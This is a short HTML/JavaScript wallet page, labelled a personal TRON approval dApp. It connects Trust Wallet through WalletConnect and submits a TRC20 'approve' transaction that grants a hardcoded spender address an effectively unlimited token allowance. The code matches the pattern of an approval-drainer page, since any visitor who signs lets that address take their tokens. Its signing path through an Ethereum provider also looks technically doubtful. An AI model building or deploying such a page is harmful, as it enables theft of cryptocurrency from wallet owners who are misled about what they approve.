<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>TRON Approval ‚Äì Personal dApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- WalletConnect -->
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.13.2/dist/index.umd.js"></script>

  <!-- TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

  <style>
    body { background:#0f172a; color:#fff; font-family:Arial; padding:20px }
    button { padding:12px; width:100%; margin:8px 0; font-weight:bold }
    .box { background:#020617; padding:12px; margin-top:12px; border-radius:6px }
  </style>
</head>

<body>

<h3>üîê TRON Approval (Personal Use)</h3>

<button onclick="connect()">Connect Trust Wallet</button>
<button onclick="approve()">Approve Token</button>

<div class="box">
  <div>Status: <span id="status">Disconnected</span></div>
  <div>Wallet: <span id="addr">-</span></div>
  <div>TxID: <span id="txid">-</span></div>
</div>

<script>
const PROJECT_ID = "e75f4f36f23f8e6dc1f84a86fdbfa4ea";

// üî¥ YOU MUST SET THESE EXPLICITLY
const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20
const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";       // your MAIN wallet
const AMOUNT = "1000000000000000000";              // token units

let provider;
let tronWeb;
let walletAddress;

async function connect() {
  provider = await window.EthereumProvider.init({
    projectId: PROJECT_ID,
    chains: [1], // dummy EVM chain (session only)
    showQrModal: true
  });

  await provider.connect();

  // Create tronWeb instance (NO private key)
  tronWeb = new TronWeb({
    fullHost: "https://api.trongrid.io"
  });

  document.getElementById("status").innerText = "Connected (session)";
}

async function approve() {
  if (!provider || !tronWeb) {
    alert("Connect wallet first");
    return;
  }

  // Build approve TX
  const contractHex = tronWeb.address.toHex(TOKEN_CONTRACT);

  const { transaction } =
    await tronWeb.transactionBuilder.triggerSmartContract(
      contractHex,
      "approve(address,uint256)",
      {},
      [
        { type: "address", value: SPENDER },
        { type: "uint256", value: AMOUNT }
      ]
    );

  // üî• CUSTOM SIGNING (wallet-specific)
  const signedTx = await provider.request({
    method: "tron_signTransaction",
    params: [transaction]
  });

  const result = await tronWeb.trx.sendRawTransaction(signedTx);

  document.getElementById("txid").innerText = result.txid;
}
</script>

</body>
</html>
